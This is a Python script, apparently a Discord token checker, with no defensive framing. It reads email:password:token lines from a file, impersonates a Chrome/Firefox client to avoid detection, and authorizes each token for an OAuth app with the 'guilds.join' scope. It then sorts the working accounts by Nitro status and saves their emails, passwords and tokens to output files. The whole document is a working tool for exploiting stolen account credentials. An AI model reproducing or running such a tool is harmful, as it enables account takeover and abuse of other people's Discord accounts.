from base64 import b64encode
from threading import Thread
import tls_client, json, os, time

os.system("cls" if os.name == "nt" else "clear")

__useragent__ = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"  #requests.get('https://discord-user-api.cf/api/v1/properties/web').json()['chrome_user_agent']
build_number = 165486  #int(requests.get('https://discord-user-api.cf/api/v1/properties/web').json()['client_build_number'])
cv = "108.0.0.0"
__properties__ = b64encode(
  json.dumps(
    {
      "os": "Windows",
      "browser": "Chrome",
      "device": "PC",
      "system_locale": "en-GB",
      "browser_user_agent": __useragent__,
      "browser_version": cv,
      "os_version": "10",
      "referrer": "https://discord.com/channels/@me",
      "referring_domain": "discord.com",
      "referrer_current": "",
      "referring_domain_current": "",
      "release_channel": "stable",
      "client_build_number": build_number,
      "client_event_source": None
    },
    separators=(',', ':')).encode()).decode()


def get_headers(token):
  headers = {
    "Authorization": token,
    "Origin": "https://discord.com",
    "Accept": "*/*",
    "X-Discord-Locale": "en-GB",
    "X-Super-Properties": __properties__,
    "User-Agent": __useragent__,
    "Referer": "https://discord.com/channels/@me",
    "X-Debug-Options": "bugReporterEnabled",
    "Content-Type": "application/json"
  }
  return headers




def check(tk, pwd):
    headers = get_headers(tk)
    # headers={'Authorization': tk,'accept': '*/*','accept-language': 'en-US','connection': 'keep-alive','cookie': f'__cfduid = {rc(43)}; __dcfduid={rc(32)}; __sdcfduid={rc(96)}; locale=en-US','DNT': '1','origin': 'https://discord.com','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','referer': 'https://discord.com/channels/@me','TE': 'Trailers','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36','X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk2LjAuNDY2NC40NSBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiOTYuMC40NjY0LjQ1Iiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6Imh0dHBzOi8vZGlzY29yZC5jb20vIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiZGlzY29yZC5jb20iLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMDg5MjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',}

    # r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json={"avatar":f'data:image/png;base64,{b64encode(img).decode("ascii")}'})
    client = tls_client.Session(client_identifier="firefox_102")
    client.headers.update(headers)
    r2 = client.post("https://ptb.discord.com/api/oauth2/authorize?client_id=1060480538361733171&redirect_uri=http%3A%2F%2Flocalhost%3A8080&response_type=code&scope=identify%20guilds.join", json={"authorize": "true"})
    if r2.status_code not in (200, 201, 204):
      print(f"[-] Invalid Token: {tk}", r2.text)
      return
    r = client.get("https://discord.com/api/v9/users/@me")
    if r.status_code in (200, 201, 204):
      id = r.json()['id']
      username = r.json()['username']
      mail = r.json()['email']
      if r.json()['premium_type'] == 2:
        print(f"[+] Valid Token: {tk} | {id} | {username}| Nitro: True")
        f2 = open("nitro_tokens.txt", "a")
        f2.write(f"{mail}:{pwd}:{tk}\n")
        f2.close()
      else:
        print(f"[+] Valid Token: {tk} | {id} | {username} Nitro: False")
        f2 = open("valid_tokens.txt", "a")
        f2.write(f"{mail}:{pwd}:{tk}\n")
        f2.close()
    else:
        print(f"[-] Invalid Token: {tk}", r.text)

f = open("tokens.txt", "r")
for line in f:
    token = line.strip()
    try:
        tk = token.split(":")[2]
        pwd = token.split(":")[1]
    except:
        tk = token
        pwd = None
    time.sleep(0.05)
    Thread(target=check, args=(tk,pwd,)).start()